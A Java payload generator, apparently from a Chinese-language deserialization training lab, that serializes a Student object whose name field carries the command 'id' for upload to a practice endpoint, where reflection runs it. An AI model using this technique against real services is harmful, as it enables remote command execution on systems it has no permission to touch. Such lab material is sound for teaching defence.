package class05;

import com.ctfstu.class05.Student;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import com.ctfstu.common.Logger;

/**
 * 生成 class05 的 payload — 反射版 readObject → 命令执行
 * 目标: 上传 Student 对象，反序列化时通过反射链执行命令
 * 与 class04 的区别: 不再直接 exec，改用 Class.forName + getMethod + invoke
 * 靶场: /class05/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        // name 字段值通过反射执行命令
        Student student = new Student("id", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class05.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已生成: class05.ser");
        System.out.println("命令已嵌入 name 字段: id");
    }
}
